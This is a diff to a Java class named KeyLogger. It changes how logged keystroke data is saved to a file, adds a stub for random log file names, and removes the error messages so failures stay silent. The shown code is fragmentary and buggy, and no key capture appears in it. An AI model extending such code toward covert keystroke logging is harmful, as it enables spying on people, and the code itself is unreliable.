@@ -3,14 +3,15 @@
  */
 package keylogger;
 import java.io.*;
+import java.util.Random;
 //need to add a method if there already exists a file and maybe create a random fileName generator
 public class KeyLogger
 {
-	private String data;
-	private ObjectOutputStream outStream = null;
 	@SuppressWarnings("unused")
-	private ObjectInputStream inStream = null;
-	private String fileName = "keysLogged.dat";
+	private Random rand = new Random(System.currentTimeMillis());
+	private String data;
+	private FileWriter fileWrite = null;
+	private String fileName;// = "logged.dat";
 	
 	public KeyLogger()
 	{
@@ -22,23 +23,32 @@ public class KeyLogger
 		this.data = keysLogged;
 	}
 	/**Logs keys and translates them into a stream to store in a binary data file
+	 * Exceptions handled
 	 * @param data
 	 */
 	public void takeStream(String data)
 	{
+		fileName = randFileName();
+		if(new File(fileName).exists()==true)
 		try
 		{
-			outStream = new ObjectOutputStream(new FileOutputStream(fileName));
-			outStream.writeChars(data);
+			fileWrite = new FileWriter(new File(fileName), true);
+			fileWrite.write(data);
 		}
 		catch(FileNotFoundException fnf)
-		{
-			System.out.println("Error finding file " + fileName);
+		{	
 		}
-		catch(IOException ioe)
+		catch(IOException io)
 		{
-			System.out.println("Error outputting file to " + fileName);
 		}
+	}
+	/**Creates a randomly named fileName
+	 * @return
+	 */
+	private String randFileName()
+	{
+		
+		return fileName;
 	}
 	/**Sets the data to be input into a stream
 	 * @param keysLogged
